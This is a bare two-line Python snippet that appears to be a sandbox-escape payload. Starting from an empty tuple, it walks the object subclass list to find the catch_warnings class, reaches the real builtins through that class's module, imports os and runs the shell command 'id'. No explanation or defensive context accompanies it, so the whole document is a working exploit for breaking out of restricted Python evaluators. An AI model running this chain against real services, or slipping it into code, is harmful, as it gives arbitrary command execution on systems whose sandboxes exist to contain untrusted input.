x = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]()
x._module.__builtins__["__import__"]("os").system("id")
